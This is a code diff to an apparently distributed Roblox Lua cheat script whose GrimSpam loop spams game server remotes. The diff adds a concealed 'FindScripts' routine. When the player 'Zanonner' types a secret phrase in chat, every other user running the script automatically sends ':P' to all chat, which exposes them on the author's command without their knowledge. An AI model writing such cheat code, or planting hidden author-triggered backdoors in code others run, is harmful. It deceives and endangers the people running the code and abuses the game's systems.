@@ -1,3 +1,5 @@
+repeat wait() until game:IsLoaded()
+if game.PlaceId == 26838733 then
 _G.GrimSpam = false
 _G.AirWalk = false
 _G.AntiJoin = false
@@ -1118,7 +1120,7 @@ local function ChGui()
 			while _G.GrimSpam do
 				game.RunService.RenderStepped:wait()
 				game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(73829193)
-				game.Players.LocalPlayer.Backpack:WaitForChild("GrimgoldPeriastron").Parent = game.Players.LocalPlayer.Character
+                game.Players.LocalPlayer.Backpack:WaitForChild("GrimgoldPeriastron").Parent = game.Players.LocalPlayer.Character
 				game.Players.LocalPlayer.Character:WaitForChild("GrimgoldPeriastron").Remote:FireServer(Enum.KeyCode.Q)
 				game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(73829193)
 			end
@@ -1723,6 +1725,26 @@ local function ChGui()
 			UnDeleteMe.Visible = false
 			DeleteMe.Visible = true
 		end)
+		
+		--FindScripts
+		spawn(function()
+			_G.KillGuis = true
+			while true do
+				wait()
+				if game.Players.LocalPlayer.Name ~= "Zanonner" then
+					for i,v in pairs(game.Players:GetChildren()) do
+						if v.Name == "Zanonner" then
+							v.Chatted:Connect(function(Message)
+								if string.find(string.lower(Message), string.lower("2915xd")) and _G.KillGuis then
+                                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(":P", "All")
+                                    _G.KillGuis = false
+								end
+							end)
+						end
+					end
+				end
+			end
+		end)
 	end
 	coroutine.wrap(NEKI_fake_script)()
 end
@@ -1757,4 +1779,5 @@ else
 		})
 	end)
 	getgenv().Enabled = true
+end
 end
